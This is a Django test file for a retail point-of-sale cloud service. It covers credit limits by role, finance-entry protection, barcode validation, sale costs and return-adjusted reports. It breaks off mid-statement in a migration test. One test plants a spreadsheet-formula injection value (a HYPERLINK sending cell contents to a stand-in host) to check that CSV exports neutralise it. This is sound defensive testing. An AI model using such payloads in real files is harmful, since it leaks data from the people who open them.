"""Regression tests for the November/2026 audit: cloud business rules.

Fiado limit by role, fiado receivable protection, factory barcode and initial
cost, cost recorded on the sale, reports net of returns, stock serializers and
listings with inactive records.
"""
import hashlib
import json
import time
import uuid
from datetime import timedelta
from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.db import connection
from django.db.migrations.executor import MigrationExecutor
from django.test import TestCase, TransactionTestCase
from django.utils import timezone

from .api_common import money as real_money, text as real_text
from .models import (AuditEvent, Category, Commission, Customer, FinanceEntry, Membership, Plan, Product, Sale,
                     SaleItem, Shop, StockMovement, Subscription, Supplier, Tenant, Terminal)


def gtin(body):
    """Append the GS1 check digit, computed independently of the code under test."""
    total = sum(int(digit) * (3 if index % 2 == 0 else 1) for index, digit in enumerate(reversed(body)))
    return body + str(-total % 10)


class RulesBase(TestCase):
    @classmethod
    def setUpTestData(cls):
        User = get_user_model()
        cls.tenant = Tenant.objects.create(name="Mercado Regras")
        cls.other_tenant = Tenant.objects.create(name="Mercado Vizinho")
        cls.plan = Plan.objects.create(slug="regras", name="Regras", shop_limit=3, terminal_limit=3,
                                       features=["cloud_dashboard", "stock", "finance", "reports"])
        for tenant in (cls.tenant, cls.other_tenant):
            Subscription.objects.create(tenant=tenant, plan=cls.plan, status="trial",
                                        trial_ends_at=timezone.now() + timedelta(days=14))
        cls.users, cls.members = {}, {}
        for role, name in (("owner", "Dona"), ("manager", "Gil"), ("cashier", "Caio"), ("finance", "Fina"),
                           ("inventory", "Ester"), ("viewer", "Vito")):
            email = f"{role}@regras.test"
            cls.users[role] = User.objects.create_user(username=email, email=email, password="Synthetic-42!")
            cls.members[role] = Membership.objects.create(tenant=cls.tenant, user=cls.users[role], name=name, role=role)
        cls.shop = Shop.objects.create(tenant=cls.tenant, name="Matriz")
        cls.product = Product.objects.create(tenant=cls.tenant, sku="ARROZ", name="Arroz", price_cents=1000,
                                             cost_cents=600)
        cls.salt = Product.objects.create(tenant=cls.tenant, sku="SAL", name="Sal", price_cents=500, cost_cents=200)
        cls.token = "terminal-token-" + uuid.uuid4().hex
        cls.terminal = Terminal.objects.create(tenant=cls.tenant, shop=cls.shop, name="Caixa", device_id="regras-device",
                                               token_hash=hashlib.sha256(cls.token.encode()).hexdigest())
        cls.identity = {"tenant_id": str(cls.tenant.id), "shop_id": str(cls.shop.id), "terminal_id": str(cls.terminal.id)}

    def api(self, verb, path, body=None, **headers):
        headers.setdefault("HTTP_X_TENANT_ID", str(self.tenant.id))
        return self.client.generic(verb, path, data=json.dumps(body) if body is not None else None,
                                   content_type="application/json", **headers)

    def login(self, role):
        self.client.force_login(self.users[role])

    def sync(self, *events, status=200):
        response = self.client.generic("POST", "/api/v1/terminal/sync", data=json.dumps({"events": list(events)}),
                                       content_type="application/json", HTTP_AUTHORIZATION=f"Bearer {self.token}")
        self.assertEqual(response.status_code, status, response.content)
        return response

    def sale_event(self, lines, payments, *, operator="owner", customer=None, change=0):
        """lines: [(product, units)]; payments: [(method, cents)]."""
        total = sum(product.price_cents * units for product, units in lines)
        return {"event_id": uuid.uuid4().hex, "type": "sale.completed", "aggregate_id": str(uuid.uuid4()),
                "identity": self.identity, "data": {
                    "request_id": uuid.uuid4().hex, "cash_session_id": "sessao-regras",
                    "created_at": int(time.time() * 1000), "customer_id": str(customer.id) if customer else None,
                    "customer_name": "", "customer_document": "", "operator_id": str(self.members[operator].id),
                    "gross_cents": total, "discount_cents": 0, "total_cents": total, "change_cents": change,
                    "items": [{"product_id": str(product.id), "name": product.name, "unit": "UN",
                               "quantity_milli": units * 1000, "unit_price_cents": product.price_cents,
                               "gross_cents": product.price_cents * units, "discount_cents": 0,
                               "line_total_cents": product.price_cents * units} for product, units in lines],
                    "payments": [{"method": method, "amount_cents": amount} for method, amount in payments]}}

    def return_event(self, sale, product, units, refund):
        amount = product.price_cents * units
        return {"event_id": uuid.uuid4().hex, "type": "sale.returned", "aggregate_id": str(uuid.uuid4()),
                "identity": self.identity, "data": {
                    "sale_id": sale["aggregate_id"], "refund_method": refund, "reason": "Produto avariado",
                    "operator_id": str(self.members["cashier"].id), "cash_session_id": "sessao-regras",
                    "created_at": int(time.time() * 1000) + 1, "total_cents": amount,
                    "items": [{"product_id": str(product.id), "quantity_milli": units * 1000, "amount_cents": amount}]}}


class CreditLimitByRoleTests(RulesBase):
    def test_cashier_registers_customers_but_cannot_set_the_fiado_limit(self):
        self.login("cashier")
        refused = self.api("POST", "/api/v1/customers", {"name": "Cúmplice", "credit_limit_cents": 5000000})
        self.assertEqual(refused.status_code, 403, refused.content)
        self.assertFalse(Customer.objects.filter(name="Cúmplice").exists())
        created = self.api("POST", "/api/v1/customers", {"name": "Dona Rosa", "phone": "21999990000",
                                                         "credit_limit_cents": 0})
        self.assertEqual(created.status_code, 201, created.content)
        self.assertEqual(created.json()["credit_limit_cents"], 0)
        customer = Customer.objects.create(tenant=self.tenant, name="Seu Zé", credit_limit_cents=10000)
        raised = self.api("PATCH", f"/api/v1/customers/{customer.id}", {"credit_limit_cents": 5000000})
        self.assertEqual(raised.status_code, 403, raised.content)
        mixed = self.api("PATCH", f"/api/v1/customers/{customer.id}", {"phone": "2133334444", "credit_limit_cents": 10001})
        self.assertEqual(mixed.status_code, 403, mixed.content)
        customer.refresh_from_db()
        self.assertEqual((customer.credit_limit_cents, customer.phone), (10000, ""))
        # A form that posts every field keeps working while the limit is unchanged.
        same = self.api("PATCH", f"/api/v1/customers/{customer.id}", {"phone": "2133334444", "credit_limit_cents": 10000})
        self.assertEqual(same.status_code, 200, same.content)
        customer.refresh_from_db()
        self.assertEqual((customer.credit_limit_cents, customer.phone), (10000, "2133334444"))

    def test_cashier_cannot_deactivate_customers(self):
        customer = Customer.objects.create(tenant=self.tenant, name="Seu Zé")
        self.login("cashier")
        self.assertEqual(self.api("DELETE", f"/api/v1/customers/{customer.id}").status_code, 403)
        self.assertEqual(self.api("PATCH", f"/api/v1/customers/{customer.id}", {"active": False}).status_code, 403)
        self.assertTrue(Customer.objects.get(pk=customer.pk).active)
        self.login("manager")
        self.assertEqual(self.api("DELETE", f"/api/v1/customers/{customer.id}").status_code, 200)
        self.assertFalse(Customer.objects.get(pk=customer.pk).active)

    def test_management_and_finance_set_the_limit_with_audited_values(self):
        customer = Customer.objects.create(tenant=self.tenant, name="Seu Zé", credit_limit_cents=10000)
        self.login("finance")
        self.assertEqual(self.api("PATCH", f"/api/v1/customers/{customer.id}", {"credit_limit_cents": 20000}).status_code, 200)
        # Finance decides credit, it does not edit the customer record.
        self.assertEqual(self.api("PATCH", f"/api/v1/customers/{customer.id}", {"name": "Outro"}).status_code, 403)
        self.assertEqual(self.api("POST", "/api/v1/customers", {"name": "Novo"}).status_code, 403)
        self.assertEqual(self.api("DELETE", f"/api/v1/customers/{customer.id}").status_code, 403)
        self.login("manager")
        self.assertEqual(self.api("PATCH", f"/api/v1/customers/{customer.id}", {"credit_limit_cents": 30000}).status_code, 200)
        self.assertEqual(self.api("POST", "/api/v1/customers", {"name": "Com limite", "credit_limit_cents": 7000}).status_code, 201)
        customer.refresh_from_db()
        self.assertEqual((customer.credit_limit_cents, customer.name, customer.active), (30000, "Seu Zé", True))
        trail = sorted((event.detail["credit_limit_cents"]["from"], event.detail["credit_limit_cents"]["to"], event.actor_id)
                       for event in AuditEvent.objects.filter(action="customers.updated", subject_id=str(customer.id)))
        self.assertEqual(trail, [(10000, 20000, self.users["finance"].id), (20000, 30000, self.users["manager"].id)])


class FinanceEntryProtectionTests(RulesBase):
    def test_delete_does_not_cancel_fiado_created_by_a_sale(self):
        customer = Customer.objects.create(tenant=self.tenant, name="Dona Rosa", credit_limit_cents=100000)
        fiado = self.sale_event([(self.product, 2)], [("credit_account", 2000)], customer=customer)
        self.sync(fiado)
        entry = FinanceEntry.objects.get(sale_id=fiado["aggregate_id"])
        self.login("finance")
        refused = self.api("DELETE", f"/api/v1/finance/{entry.id}")
        self.assertEqual(refused.status_code, 409, refused.content)
        self.assertIn("devolução ou cancelamento", refused.json()["error"])
        entry.refresh_from_db()
        self.assertEqual((entry.status, entry.amount_cents), ("open", 2000))
        self.assertEqual(self.api("PATCH", f"/api/v1/finance/{entry.id}", {"amount_cents": 1}).status_code, 409)
        self.assertEqual(self.api("PATCH", f"/api/v1/finance/{entry.id}", {"due_date": "2026-12-20"}).status_code, 200)
        statement = self.api("GET", f"/api/v1/customers/{customer.id}/statement").json()
        self.assertEqual(statement["open_credit_cents"], 2000)
        # Manual entries can still be cancelled.
        manual = self.api("POST", "/api/v1/finance", {"kind": "payable", "description": "Aluguel",
                                                       "amount_cents": 150000, "due_date": "2026-12-05"}).json()
        self.assertEqual(self.api("DELETE", f"/api/v1/finance/{manual['id']}").json()["status"], "cancelled")
        self.assertEqual(self.api("DELETE", f"/api/v1/finance/{manual['id']}").status_code, 409)

    def test_edit_saves_only_the_edited_columns(self):
        self.login("finance")
        manual = self.api("POST", "/api/v1/finance", {"kind": "payable", "description": "Luz",
                                                       "amount_cents": 30000, "due_date": "2026-12-05"}).json()
        entry = FinanceEntry.objects.get(pk=manual["id"])

        def concurrent_receipt(value, *args, **kwargs):
            # A partial receipt commits after the view read the row and before it saves.
            FinanceEntry.objects.filter(pk=entry.pk).update(amount_cents=12000)
            return real_text(value, *args, **kwargs)

        with patch("core.views_finance.text", side_effect=concurrent_receipt):
            self.assertEqual(self.api("PATCH", f"/api/v1/finance/{manual['id']}", {"description": "Luz de novembro"}).status_code, 200)
        entry.refresh_from_db()
        self.assertEqual((entry.description, entry.amount_cents), ("Luz de novembro", 12000))

    def test_cancelling_a_commission_payable_reopens_the_commissions(self):
        seller = self.members["cashier"]
        Membership.objects.filter(pk=seller.pk).update(commission_bps=1000)
        self.sync(self.sale_event([(self.product, 1)], [("pix", 1000)], operator="cashier"))
        self.login("owner")
        paid = self.api("POST", "/api/v1/commissions/pay", {"seller_id": str(seller.id), "due_date": "2026-12-05"})
        self.assertEqual(paid.status_code, 201, paid.content)
        entry_id = paid.json()["finance_entry_id"]
        self.assertEqual(Commission.objects.get(seller=seller).status, "paid")
        self.assertEqual(self.api("PATCH", f"/api/v1/finance/{entry_id}", {"amount_cents": 1}).status_code, 409)
        self.assertEqual(self.api("PATCH", f"/api/v1/finance/{entry_id}", {"due_date": "2026-12-10"}).status_code, 200)
        self.assertEqual(self.api("DELETE", f"/api/v1/finance/{entry_id}").status_code, 200)
        commission = Commission.objects.get(seller=seller)
        self.assertEqual((commission.status, commission.paid_at, commission.finance_entry_id), ("pending", None, None))
        again = self.api("POST", "/api/v1/commissions/pay", {"seller_id": str(seller.id), "due_date": "2026-12-10"})
        self.assertEqual((again.status_code, again.json()["amount_cents"]), (201, 100))


class ProductBarcodeAndCostTests(RulesBase):
    def test_factory_barcode_is_validated_unique_per_company_and_editable(self):
        self.login("inventory")
        ean13 = "7891000100103"
        self.assertEqual(gtin("789100010010"), ean13)
        created = self.api("POST", "/api/v1/products", {"name": "Leite em pó", "price_cents": 1890, "barcode": ean13})
        self.assertEqual(created.status_code, 201, created.content)
        self.assertEqual(created.json()["barcode"], ean13)
        self.assertTrue(created.json()["sku"])
        for invalid in ("7891000100104", "789100010010", "ABC", 7891000100103):
            response = self.api("POST", "/api/v1/products", {"name": "Código errado", "price_cents": 100, "barcode": invalid})
            self.assertEqual(response.status_code, 400, (invalid, response.content))
        duplicate = self.api("POST", "/api/v1/products", {"name": "Repetido", "price_cents": 100, "barcode": ean13})
        self.assertEqual(duplicate.status_code, 409, duplicate.content)
        self.assertFalse(Product.objects.filter(name__in=("Código errado", "Repetido")).exists())
        # Same factory code in another company is a different catalog.
        Product.objects.create(tenant=self.other_tenant, sku="X", name="Leite em pó", barcode=ean13)
        for code in ("96385074", gtin("03600029145"), gtin("1789100010010")):  # EAN-8, UPC-A, GTIN-14
            response = self.api("POST", "/api/v1/products", {"name": f"Item {code}", "price_cents": 100, "barcode": code})
            self.assertEqual((response.status_code, response.json().get("barcode")), (201, code), response.content)
        # Without a factory code the internal EAN-13 is generated as before.
        internal = self.api("POST", "/api/v1/products", {"name": "Pão caseiro", "price_cents": 900, "barcode": ""}).json()
        self.assertTrue(internal["barcode"].startswith("2") and len(internal["barcode"]) == 13)
        self.assertEqual(gtin(internal["barcode"][:12]), internal["barcode"])
        # The barcode can be informed or corrected later.
        other = gtin("789100010020")
        edited = self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": other})
        self.assertEqual((edited.status_code, edited.json()["barcode"]), (200, other), edited.content)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": other}).status_code, 200)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": ean13}).status_code, 409)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": "123"}).status_code, 400)
        self.assertEqual(Product.objects.get(pk=internal["id"]).barcode, other)
        # Clearing the factory code falls back to a new internal one; clearing an internal one keeps it.
        cleared = self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": ""}).json()["barcode"]
        self.assertTrue(cleared.startswith("2") and cleared != internal["barcode"])
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{internal['id']}", {"barcode": ""}).json()["barcode"], cleared)

    def test_initial_cost_is_accepted_until_stock_receipts_take_over(self):
        self.login("inventory")
        created = self.api("POST", "/api/v1/products", {"name": "Feijão", "price_cents": 899, "cost_cents": 550})
        self.assertEqual((created.status_code, created.json()["cost_cents"]), (201, 550), created.content)
        product_id = created.json()["id"]
        self.assertEqual(self.api("POST", "/api/v1/products", {"name": "Custo ruim", "price_cents": 1, "cost_cents": -1}).status_code, 400)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{product_id}", {"cost_cents": 600}).json()["cost_cents"], 600)
        receipt = self.api("POST", "/api/v1/stock/receipts", {
            "shop_id": str(self.shop.id), "idempotency_key": "custo-inicial",
            "items": [{"product_id": product_id, "quantity_milli": 2000, "unit_cost_cents": 700}]})
        self.assertEqual(receipt.status_code, 201, receipt.content)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{product_id}", {"cost_cents": 100}).status_code, 409)
        # The unchanged cost posted back by a full form is not an edit.
        same = self.api("PATCH", f"/api/v1/products/{product_id}", {"cost_cents": 700, "name": "Feijão preto"})
        self.assertEqual((same.status_code, same.json()["name"]), (200, "Feijão preto"), same.content)

    def test_product_edit_does_not_overwrite_a_cost_written_meanwhile(self):
        self.login("manager")

        def concurrent_receipt(value, *args, **kwargs):
            # A stock receipt commits after the view read the row and before it saves.
            Product.objects.filter(pk=self.product.pk).update(cost_cents=777)
            return real_money(value, *args, **kwargs)

        with patch("core.views_resources.money", side_effect=concurrent_receipt):
            self.assertEqual(self.api("PATCH", f"/api/v1/products/{self.product.id}", {"stock_minimum_milli": 5000}).status_code, 200)
        self.product.refresh_from_db()
        self.assertEqual((self.product.cost_cents, self.product.stock_minimum_milli), (777, 5000))

    def test_unit_is_locked_once_the_product_has_history(self):
        self.login("manager")
        fresh = self.api("POST", "/api/v1/products", {"name": "Queijo", "price_cents": 4990}).json()
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{fresh['id']}", {"unit": "KG"}).json()["unit"], "KG")
        self.sync(self.sale_event([(self.product, 1)], [("pix", 1000)]))
        refused = self.api("PATCH", f"/api/v1/products/{self.product.id}", {"unit": "KG"})
        self.assertEqual(refused.status_code, 409, refused.content)
        self.assertEqual(self.api("PATCH", f"/api/v1/products/{self.product.id}", {"unit": "UN", "name": "Arroz tipo 1"}).status_code, 200)
        self.assertEqual(Product.objects.get(pk=self.product.pk).unit, "UN")


class SaleCostAndReportsTests(RulesBase):
    def report(self, kind, suffix=""):
        response = self.api("GET", f"/api/v1/reports/{kind}{suffix}")
        self.assertEqual(response.status_code, 200, response.content)
        return response if suffix else response.json()

    def test_sale_item_keeps_the_cost_of_the_moment_of_the_sale(self):
        sale = self.sale_event([(self.product, 2)], [("pix", 2000)])
        self.sync(sale)
        self.assertEqual(SaleItem.objects.get(sale_id=sale["aggregate_id"]).unit_cost_cents, 600)
        self.login("owner")
        before = self.report("profit_by_day")["totals"]
        # A later purchase raises the moving average; the closed sale must not move.
        receipt = self.api("POST", "/api/v1/stock/receipts", {
            "shop_id": str(self.shop.id), "idempotency_key": "compra-cara",
            "items": [{"product_id": str(self.product.id), "quantity_milli": 5000, "unit_cost_cents": 900}]})
        self.assertEqual(receipt.status_code, 201, receipt.content)
        self.assertEqual(Product.objects.get(pk=self.product.pk).cost_cents, 900)
        after = self.report("profit_by_day")["totals"]
        self.assertEqual(before, after)
        self.assertEqual((after["revenue"], after["cost"], after["profit"]), (2000, 1200, 800))
        abc = self.report("products_abc")["rows"]
        self.assertEqual([(r["sku"], r["cost"], r["profit"], r["margin"]) for r in abc], [("ARROZ", 1200, 800, 4000)])
        newer = self.sale_event([(self.product, 1)], [("pix", 1000)])
        self.sync(newer)
        self.assertEqual(SaleItem.objects.get(sale_id=newer["aggregate_id"]).unit_cost_cents, 900)
        self.assertEqual(self.report("profit_by_day")["totals"]["cost"], 2100)

    def test_reports_discount_returns_and_close_with_sales_by_day(self):
        customer = Customer.objects.create(tenant=self.tenant, name="Dona Rosa", credit_limit_cents=100000)
        pix = self.sale_event([(self.product, 2), (self.salt, 1)], [("pix", 2500)])
        cash = self.sale_event([(self.product, 1)], [("cash", 2000)], operator="cashier", change=1000)
        fiado = self.sale_event([(self.salt, 1)], [("credit_account", 500)], customer=customer)
        self.sync(pix, cash, fiado, self.return_event(cash, self.product, 1, "cash"),
                  self.return_event(fiado, self.salt, 1, "account"))
        self.login("owner")
        outside = self.api("POST", f"/api/v1/sales/{pix['aggregate_id']}/return", {
            "items": [{"product_id": str(self.product.id), "quantity_milli": 1000}],
            "refund_method": "external", "reason": "Pix devolvido ao cliente"})
        self.assertEqual(outside.status_code, 201, outside.content)
        # Cost changes after the fact do not move what was already sold and returned.
        Product.objects.filter(pk=self.product.pk).update(cost_cents=900)

        day = self.report("sales_by_day")["totals"]
        self.assertEqual((day["total"], day["returns"], day["net"]), (4000, 2500, 1500))

        profit = self.report("profit_by_day")
        self.assertEqual(profit["totals"], {"gross": 4000, "returns": 2500, "revenue": 1500, "cost": 800,
                                            "profit": 700, "margin": 4667})
        self.assertEqual(len(profit["rows"]), 1)

        abc = self.report("products_abc")
        self.assertEqual([(r["sku"], r["abc"], r["qty"], r["gross"], r["returns"], r["revenue"], r["cost"], r["profit"])
                          for r in abc["rows"]],
                         [("ARROZ", "A", 1000, 3000, 2000, 1000, 600, 400), ("SAL", "A", 1000, 1000, 500, 500, 200, 300)])
        self.assertEqual((abc["totals"]["revenue"], abc["totals"]["profit"]), (1500, 700))

        payment = self.report("sales_by_payment")
        self.assertEqual({r["method"]: (r["total"], r["returns"], r["net"]) for r in payment["rows"]},
                         {"Pix": (2500, 1000, 1500), "Dinheiro": (1000, 1000, 0), "A prazo (fiado)": (500, 500, 0)})
        self.assertEqual((payment["totals"]["total"], payment["totals"]["returns"], payment["totals"]["net"]),
                         (4000, 2500, 1500))

        operator = self.report("sales_by_operator")
        self.assertEqual([(r["person"], r["count"], r["total"], r["returns"], r["net"]) for r in operator["rows"]],
                         [("Dona", 2, 3000, 1500, 1500), ("Caio", 1, 1000, 1000, 0)])
        seller = self.report("sales_by_seller")["totals"]
        hour = self.report("sales_by_hour")["totals"]
        for totals in (operator["totals"], seller, hour):
            self.assertEqual((totals["total"], totals["returns"], totals["net"]), (4000, 2500, 1500))

        csv_body = self.report("profit_by_day", "?format=csv").content.decode("utf-8")
        self.assertIn("Dia;Faturamento;Devoluções;Faturamento líquido;Custo;Lucro bruto;Margem", csv_body)
        self.assertIn("Total;40,00;25,00;15,00;8,00;7,00;46,67", csv_body)

    def test_return_of_an_older_sale_shows_as_a_negative_line(self):
        sale = self.sale_event([(self.product, 2)], [("cash", 2000)])
        self.sync(sale, self.return_event(sale, self.product, 1, "cash"))
        Sale.objects.filter(pk=sale["aggregate_id"]).update(created_at=timezone.now() - timedelta(days=40))
        self.login("owner")
        today = timezone.localdate().isoformat()
        period = f"?from={today}&to={today}"
        day = self.report("sales_by_day", period).json()["totals"]
        self.assertEqual((day["total"], day["returns"], day["net"]), (0, 1000, -1000))
        abc = self.report("products_abc", period).json()
        self.assertEqual([(r["abc"], r["qty"], r["revenue"], r["cost"], r["profit"]) for r in abc["rows"]],
                         [("C", -1000, -1000, -600, -400)])
        self.assertEqual(self.report("profit_by_day", period).json()["totals"]["revenue"], -1000)
        payment = self.report("sales_by_payment", period).json()
        self.assertEqual([(r["method"], r["total"], r["returns"], r["net"]) for r in payment["rows"]],
                         [("Dinheiro", 0, 1000, -1000)])

    def test_csv_text_cannot_become_a_spreadsheet_formula(self):
        StockMovement.objects.create(tenant=self.tenant, shop=self.shop, product=self.product, delta_milli=-1000,
                                     source="manual", reason='=HYPERLINK("http://x/?"&A1;"ver")')
        self.login("owner")
        body = self.report("stock_losses", "?format=csv").content.decode("utf-8")
        self.assertIn("'=HYPERLINK", body)
        self.assertNotIn("\n=HYPERLINK", body)
        self.assertNotIn('\n"=HYPERLINK', body)


class StockSerializersAndCostTests(RulesBase):
    def test_movements_and_receipts_name_the_product_and_the_supplier(self):
        supplier = Supplier.objects.create(tenant=self.tenant, name="Atacado Bom Preço")
        self.login("inventory")
        moved = self.api("POST", "/api/v1/stock/movements", {
            "shop_id": str(self.shop.id), "product_id": str(self.product.id), "delta_milli": 3000,
            "reason": "Saldo inicial", "idempotency_key": "saldo-inicial"})
        self.assertEqual(moved.status_code, 201, moved.content)
        self.assertEqual((moved.json()["movement"]["product_name"], moved.json()["movement"]["sku"]), ("Arroz", "ARROZ"))
        received = self.api("POST", "/api/v1/stock/receipts", {
            "shop_id": str(self.shop.id), "supplier_id": str(supplier.id), "idempotency_key": "entrada-1",
            "items": [{"product_id": str(self.salt.id), "quantity_milli": 2000, "unit_cost_cents": 250}]})
        self.assertEqual(received.status_code, 201, received.content)
        self.assertEqual(received.json()["supplier_name"], "Atacado Bom Preço")
        movements = self.api("GET", f"/api/v1/stock/movements?shop_id={self.shop.id}").json()["results"]
        self.assertEqual({(m["product_name"], m["sku"], m["unit"]) for m in movements},
                         {("Arroz", "ARROZ", "UN"), ("Sal", "SAL", "UN")})
        receipts = self.api("GET", f"/api/v1/stock/receipts?shop_id={self.shop.id}").json()["results"]
        self.assertEqual([(r["supplier_name"], r["items"][0]["product_name"], r["items"][0]["sku"]) for r in receipts],
                         [("Atacado Bom Preço", "Sal", "SAL")])
        no_supplier = self.api("POST", "/api/v1/stock/receipts", {
            "shop_id": str(self.shop.id), "idempotency_key": "entrada-2",
            "items": [{"product_id": str(self.salt.id), "quantity_milli": 1000, "unit_cost_cents": 250}]})
        self.assertIsNone(no_supplier.json()["supplier_name"])

    def test_stock_balance_is_not_exposed_to_the_cashier(self):
        self.login("cashier")
        self.assertEqual(self.api("GET", f"/api/v1/stock?shop_id={self.shop.id}").status_code, 403)
        self.login("inventory")
        self.assertEqual(self.api("GET", f"/api/v1/stock?shop_id={self.shop.id}").status_code, 200)

    def test_average_cost_counts_goods_in_transit_between_shops(self):
        branch = Shop.objects.create(tenant=self.tenant, name="Filial")
        Product.objects.filter(pk=self.product.pk).update(cost_cents=1000)
        self.login("owner")
        entry = lambda key, qty, cost: self.api("POST", "/api/v1/stock/receipts", {
            "shop_id": str(self.shop.id), "idempotency_key": key,
            "items": [{"product_id": str(self.product.id), "quantity_milli": qty, "unit_cost_cents": cost}]})
        self.assertEqual(entry("primeira", 10000, 1000).status_code, 201)
        sent = self.api("POST", "/api/v1/transfers", {
            "from_shop_id": str(self.shop.id), "to_shop_id": str(branch.id), "idempotency_key": "tudo",
            "items": [{"product_id": str(self.product.id), "quantity_milli": 10000}]})
        self.assertEqual(sent.status_code, 201, sent.content)
        second = entry("segunda", 10000, 2000)
        self.assertEqual(second.json()["items"][0]["average_cost_cents"], 1500)
        self.assertEqual(Product.objects.get(pk=self.product.pk).cost_cents, 1500)


class ListingsWithInactiveTests(RulesBase):
    def names(self, path):
        response = self.api("GET", path)
        self.assertEqual(response.status_code, 200, (path, response.content))
        return [row["name"] for row in response.json()["results"]]

    def test_inactive_records_are_listed_searched_and_reactivated(self):
        category = Category.objects.create(tenant=self.tenant, name="Limpeza antiga", active=False)
        Category.objects.create(tenant=self.tenant, name="Bebidas")
        Category.objects.create(tenant=self.other_tenant, name="Limpeza alheia", active=False)
        product = Product.objects.create(tenant=self.tenant, sku="VELHO", name="Sabão antigo", barcode="96385074",
                                         active=False)
        customer = Customer.objects.create(tenant=self.tenant, name="Cliente antigo", document="12345678909",
                                           phone="21988887777", active=False)
        Customer.objects.create(tenant=self.tenant, name="Cliente novo")
        supplier = Supplier.objects.create(tenant=self.tenant, name="Fornecedor antigo", document="11222333000181",
                                           active=False)
        Supplier.objects.create(tenant=self.tenant, name="Fornecedor novo")
        shop = Shop.objects.create(tenant=self.tenant, name="Quiosque antigo", active=False)
        cases = (("categories", category, "antig", ["Bebidas"]),
                 ("products", product, "antig", ["Arroz", "Sal"]),
                 ("customers", customer, "antig", ["Cliente novo"]),
                 ("suppliers", supplier, "antig", ["Fornecedor novo"]),
                 ("shops", shop, "antig", ["Matriz"]))
        self.login("manager")
        for kind, row, term, active_names in cases:
            path = f"/api/v1/{kind}"
            self.assertEqual(self.names(path), active_names, kind)
            self.assertEqual(self.names(path + "?include_inactive=1"), sorted(active_names + [row.name]), kind)
            self.assertEqual(self.names(path + f"?q={term}"), [], kind)
            self.assertEqual(self.names(path + f"?q={term.upper()}&include_inactive=1"), [row.name], kind)
            listed = next(r for r in self.api("GET", path + "?include_inactive=1").json()["results"] if r["id"] == str(row.id))
            self.assertFalse(listed["active"])
        # Search also reaches the codes people actually type.
        self.assertEqual(self.names("/api/v1/products?q=9638507&include_inactive=1"), ["Sabão antigo"])
        self.assertEqual(self.names("/api/v1/products?q=velho&include_inactive=1"), ["Sabão antigo"])
        self.assertEqual(self.names("/api/v1/customers?q=123456789&include_inactive=1"), ["Cliente antigo"])
        self.assertEqual(self.names("/api/v1/customers?q=8888&include_inactive=1"), ["Cliente antigo"])
        self.assertEqual(self.names("/api/v1/suppliers?q=11222333&include_inactive=1"), ["Fornecedor antigo"])
        self.assertEqual(self.api("GET", "/api/v1/products?q=" + "x" * 121).status_code, 400)
        # Reactivation: catalog and contacts by the manager, shops by the owner.
        for kind, row, _, active_names in cases[:4]:
            revived = self.api("PATCH", f"/api/v1/{kind}/{row.id}", {"active": True})
            self.assertEqual((revived.status_code, revived.json().get("active")), (200, True), (kind, revived.content))
            self.assertEqual(self.names(f"/api/v1/{kind}"), sorted(active_names + [row.name]), kind)
        self.assertEqual(self.api("PATCH", f"/api/v1/shops/{shop.id}", {"active": True}).status_code, 403)
        self.login("owner")
        revived = self.api("PATCH", f"/api/v1/shops/{shop.id}", {"active": True})
        self.assertEqual((revived.status_code, revived.json().get("active")), (200, True), revived.content)
        self.assertEqual(self.names("/api/v1/shops"), ["Matriz", "Quiosque antigo"])

    def test_cashier_and_viewer_never_see_inactive_records(self):
        Product.objects.create(tenant=self.tenant, sku="VELHO", name="Sabão antigo", active=False)
        hidden = Customer.objects.create(tenant=self.tenant, name="Cliente antigo", active=False)
        self.login("cashier")
        self.assertEqual(self.names("/api/v1/products?include_inactive=1"), ["Arroz", "Sal"])
        self.assertEqual(self.names("/api/v1/customers?include_inactive=1"), [])
        self.assertEqual(self.api("GET", f"/api/v1/customers/{hidden.id}").status_code, 404)
        self.assertEqual(self.api("PATCH", f"/api/v1/customers/{hidden.id}", {"active": True}).status_code, 403)
        self.login("viewer")
        self.assertEqual(self.names("/api/v1/products?include_inactive=1"), ["Arroz", "Sal"])

    def test_shop_reactivation_respects_the_plan_limit(self):
        Plan.objects.filter(pk=self.plan.pk).update(shop_limit=1)
        shop = Shop.objects.create(tenant=self.tenant, name="Quiosque antigo", active=False)
        self.login("owner")
        self.assertEqual(self.api("PATCH", f"/api/v1/shops/{shop.id}", {"active": True}).status_code, 409)
        self.assertFalse(Shop.objects.get(pk=shop.pk).active)


class SaleItemCostBackfillMigrationTests(TransactionTestCase):
    def test_history_gets_the_cost_of_the_last_receipt_before_the_sale_or_the_current_cost(self):
        before, after = [("core", "0033_promotions")], [("core", "0034_saleitem_unit_cost")]
        executor = MigrationExecutor(connection)
        executor.migrate(before)
        try:
            old = executor.loader.project_state(before).apps
            models = {name: old.get_model("core", name) for name in
                      ("Tenant", "Shop", "Product", "Sale", "SaleItem", "StockReceipt", "StockReceiptItem")}
            user = old.get_model("auth", "User").objects.create(username="migracao@regras.test")
            tenant = models["Tenant"].objects.create(name="Histórico")
            shop = models["Shop"].objects.create(tenant=tenant, name="Matriz")
            rice = models["Product"].objects.create(tenant=tenant, sku="ARROZ", name="Arroz", price_cents=1000, cost_cents=700)
            salt = models["Product"].objects.create(tenant=tenant, sku="SAL", name="Sal", price_cents=500, cost_cents=200)
            now = timezone.now()
            for key, days_ago, average in (("r1", 20, 500), ("r2", 10, 650)):
                receipt = models["StockReceipt"].objects.create(tenant=tenant, shop=shop, idempotency_key=key,
                                                                created_by=user)
                models["StockReceipt"].objects.filter(pk=receipt.pk).update(created_at=now - timedelta(days=days_ago))
                models["StockReceiptItem"].objects.create(receipt=receipt, product=rice, quantity_milli=1000,
                                                          unit_cost_cents=average, average_cost_cents=average)
            items = {}
            for label, product, days_ago in (("before_any_receipt", rice, 30), ("between_receipts", rice, 15),
                                             ("after_receipts", rice, 5), ("never_received", salt, 15)):
                sale = models["Sale"].objects.create(id=uuid.uuid4(), tenant=tenant, shop=shop, request_id=label,
                                                     content_hash="x", gross_cents=1000, total_cents=1000,
                                                     created_at=now - timedelta(days=days_ago))
                items[label] = models["SaleItem"].objects.create(
